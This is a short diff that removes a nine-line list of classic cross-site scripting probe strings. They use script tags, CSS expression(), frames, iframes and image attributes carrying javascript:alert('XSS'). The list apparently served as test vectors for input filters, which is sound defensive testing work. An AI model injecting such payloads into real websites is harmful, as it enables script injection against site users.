@@ -1,9 +1,0 @@
-<SCRIPT>alert('XSS')</SCRIPT> 
-<DIV STYLE="width: expression(alert('XSS'));"> 
-<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET> 
-<IFRAME SRC="javascript:alert('XSS');"></IFRAME> 
-<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"> 
-<IMG SRC="javascript:alert('XSS');"> 
-<IMG SRC=javascript:alert('XSS')> 
-<IMG DYNSRC="javascript:alert('XSS');"> 
-<IMG LOWSRC="javascript:alert('XSS');"> 
